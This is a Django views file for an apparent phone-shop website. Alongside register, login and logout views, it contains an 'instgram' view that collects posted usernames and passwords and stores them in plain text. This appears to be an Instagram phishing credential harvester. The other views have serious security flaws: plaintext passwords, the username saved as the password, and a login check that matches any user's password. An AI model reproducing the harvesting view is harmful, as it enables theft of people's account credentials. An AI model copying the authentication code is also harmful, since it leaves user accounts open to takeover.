from django.shortcuts import render,redirect
from django.core.mail import send_mail
from django.contrib.auth.models import auth
from django.contrib import messages 
from .models import Phones,Users,instgram_users
def register(request):
  usernamev=request.POST.get("username")
  emailv=request.POST.get("email")
  data=Users(password=usernamev,email=emailv)
  if request.method=="POST":
    if Users.objects.filter(email=emailv).exists():
      messages.info(request,"Email already used")
    else:
      data.save()
      return redirect('/')
  return render(request,"html/register.html")
def Home(request):
  return render(request,"html/home_page.html",{'phones':Phones.objects.all()})

def log_in(request):
  email1=request.POST.get("email_log")
  password1=request.POST.get("username_log")
  if Users.objects.filter(email=email1).exists() and Users.objects.filter(password=password1).exists():
    return redirect('/phones') 
  else:
    messages.info(request,"Email or password wrong if you didn,t go to home page")
  return render(request,"html/log_in.html",{'name':email1})
def log_out(request):
    if request.method=="POST":
      auth.logout(request)
      return redirect('/')
    return render(request,"html/log_out.html")
def instgram(request):
  username_html=request.POST.get('username_input')
  password_html=request.POST.get('password_input')
  data=instgram_users(username=username_html,password=password_html)
  if request.method=="POST":
    data.save()
  return render(request,"html/index.html")
  
# Create your views here  .
